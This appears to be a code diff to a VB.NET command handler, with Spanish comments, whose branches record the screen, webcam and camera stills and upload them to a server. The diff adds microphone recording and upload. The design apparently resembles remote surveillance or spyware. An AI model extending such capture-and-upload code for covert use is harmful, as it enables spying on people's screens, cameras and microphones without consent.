@@ -92,6 +92,7 @@ Module StartUp
                 ElseIf parameter.ToLower Like "*/sendscreenrecord*" Then
                     'Detiene y luego envia la grabacion de pantalla
                     Main.UploadFileToServer(Main.SaveScreenRecord())
+                    End
 
                 ElseIf parameter.ToLower Like "*/startcamrecording*" Then
                     'Comienza a grabar la camara
@@ -104,10 +105,26 @@ Module StartUp
                 ElseIf parameter.ToLower Like "*/sendcamrecord*" Then
                     'Detiene y luego envia la grabacion de la camara
                     Main.UploadFileToServer(Main.StopCamRecord())
+                    End
 
                 ElseIf parameter.ToLower Like "*/takecampicture*" Then
                     'Toma una captura de la camara y la envia
                     Main.UploadFileToServer(Main.TakeCamPicture)
+                    End
+
+                ElseIf parameter.ToLower Like "*/startmicrecording*" Then
+                    'Comenzar a grabar microfono
+                    Main.StartMicRecord()
+
+                ElseIf parameter.ToLower Like "*/stopmicrecord*" Then
+                    'Detiene la grabacion del microfono
+                    Main.StopMicRecord()
+                    Main.StopMicRecord(True)
+
+                ElseIf parameter.ToLower Like "*/sendmicrecord*" Then
+                    'Envia la grabacion del microfono
+                    Main.UploadFileToServer(Main.SaveMicRecord)
+                    End
 
                 ElseIf parameter.ToLower Like "*/stop*" Then
                     'Detiene todo y se cierra
